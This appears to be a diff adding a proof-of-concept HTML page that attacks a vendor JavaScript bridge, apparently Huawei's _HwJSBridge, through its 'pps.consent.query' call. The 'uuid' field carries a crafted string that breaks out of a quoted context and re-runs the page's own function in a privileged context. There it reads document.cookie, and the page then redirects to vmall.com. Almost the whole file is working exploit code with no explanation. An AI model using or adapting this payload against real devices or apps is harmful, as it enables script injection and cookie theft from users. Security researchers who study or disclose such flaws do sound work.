@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<h1>Hello</h1>
+<head>
+    <meta charset="UTF-8">
+    <title>HW</title>
+    <script type="text/javascript">
+        window.noJump = true;
+        window.current = location.href;
+        function crazy(){
+            if(window.noJump){
+                var funcString = crazy.toString().replaceAll('\n','');
+                var funcCalling = '(()=>{' + funcString + ';crazy();})()';
+                var payload = '\'},\'*\');}}};' + funcCalling + '//';
+                var content = {};
+                var data = {'content': JSON.stringify(content), 'url': 'https://www.baidu.com', 'webid':'deadbeef', 'top':false, 'uuid': payload};
+                window._HwJSBridge.invokeAsync('pps.consent.query',  JSON.stringify(data), '123');
+            }else{
+                alert(document.cookie);
+            }
+        }
+        crazy();
+        location.href="https://vmall.com";        
+    </script>
+</head>
+</html>
